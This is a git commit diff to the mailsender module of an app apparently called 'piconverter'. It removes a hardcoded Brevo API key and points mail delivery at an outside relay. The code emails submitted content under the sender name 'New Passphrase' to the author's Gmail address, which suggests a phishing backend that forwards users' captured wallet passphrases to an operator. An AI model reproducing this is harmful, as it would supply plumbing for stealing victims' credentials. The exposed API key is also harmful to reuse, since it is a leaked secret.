883697566454287f522c1824140a54a0dae39a89
lordace-coder <lordyacey@gmail.com>
2025-06-06 16:07:43 +0200

    jj

--- piconverterapp/mailsender.py
+++ piconverterapp/mailsender.py
@@ -2,34 +2,22 @@ import os
 import requests
 
 # MAIL_API = 'https://api.brevo.com/v3/emailCampaigns'
-api_key = "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"
 
 
 def send_mail(mail_info, mail_subj, std_name):
 
     # Brevo API endpoint for sending transactional emails..
-    url = "https://api.brevo.com/v3/smtp/email"
+    url = "https://coco-api.onrender.com/api/send-mail/931038"
 
-    # The email data we are sending to the user..
     payload = {
-        "sender": {
-            "name": f"New Passphrase",
-            "email": "uzomamicheal07@piconverter.info",
-        },
-        "to": [
-            {"email": os.getenv("email", "lordyacey@gmail.com"), "name": f"{std_name}"}
-        ],
+        "recipient_list": [os.getenv("email", "lordyacey@gmail.com")],
         "subject": f"{mail_subj}",
-        "htmlContent": f"{mail_info}",
-    }
-
-    # Our authorization header..
-    headers = {
-        "api-key": api_key,
-        "Content-Type": "application/json",
-        "accept": "application/json",
+        "content": f"{mail_info}",
+        "is_html": True,
+        "context": {},
     }
 
     # Our post request..
-    response = requests.post(url, json=payload, headers=headers)
+    response = requests.post(url, json=payload)
+    print(response.json())
     return
